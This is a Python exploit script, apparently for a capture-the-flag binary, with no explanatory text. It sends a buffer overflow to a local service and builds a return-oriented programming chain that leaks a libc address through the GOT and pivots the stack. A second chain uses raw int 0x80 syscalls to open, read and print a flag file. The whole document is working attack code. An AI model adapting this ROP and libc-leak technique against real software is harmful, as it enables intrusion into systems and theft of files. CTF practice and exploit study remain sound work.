import socket
import struct
import re
import time

# ncat -vc 'LD_LIBRARY_PATH=. ./vuln2' -kl 8888

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sc.connect(('localhost', 4444))

def W(x):
  sc.send(x)

def R():
  return sc.recv(4096)

def PI(x):
  return struct.pack('I', x)

def UI(s):
  return struct.unpack('I', s)[0]

print R()
print R()

main_text = 0x08048774
write_plt = 0x08048490
write_got = 0x0804a02c
read_plt  = 0x08048410
read_got  = 0x0804a00c
read_offset = 0x000d9d20
pop_bx_si_di_bp_ret = 0x0804883c
pop_si_di_bp_ret = pop_bx_si_di_bp_ret+1
pop_di_bp_ret = pop_bx_si_di_bp_ret+2
pop_bp_ret = pop_bx_si_di_bp_ret+3
leave_ret = 0x8048565

free_buf = 0x0804a050

W('A'*28 +
    PI(write_plt) + PI(pop_si_di_bp_ret) + PI(1) + PI(read_got) + PI(4) +
    PI(read_plt) + PI(pop_si_di_bp_ret) + PI(0) + PI(free_buf) + PI(1000)+
    PI(pop_bp_ret) + PI(free_buf) + PI(leave_ret))

libc_base = UI(R()[0:4]) - read_offset
print 'libc_base = ' + hex(libc_base)

int_0x80 = 0x0002e3c5 + libc_base
pop_eax_ret = 0x0019c864 + libc_base
pop_ebx_ret = 0x000198ae + libc_base
pop_edx_ecx_ebx_ret = 0x000f75b1 + libc_base
mov_edxeax_mov_eaxedx_ret = 0x001198b9
int80_pop_bp_di_si_bx_ret = 0xea3c1 + libc_base

W(PI(0) +
    PI(pop_eax_ret) + PI(5) +
    PI(pop_edx_ecx_ebx_ret) + PI(0) + PI(0) + PI(free_buf+112) + 
    PI(int80_pop_bp_di_si_bx_ret) + PI(0) + PI(0) + PI(0) + PI(0) +
    PI(pop_eax_ret) + PI(3) +
    PI(pop_edx_ecx_ebx_ret) + PI(200) + PI(free_buf+112) + PI(3) +
    PI(int80_pop_bp_di_si_bx_ret) + PI(0) + PI(0) + PI(0) + PI(0) +
    PI(write_plt) + PI(0) + PI(1) + PI(free_buf+112) + PI(200) +
    '/home/rop/flag\x00')
    #'./flag\x00')

print R()
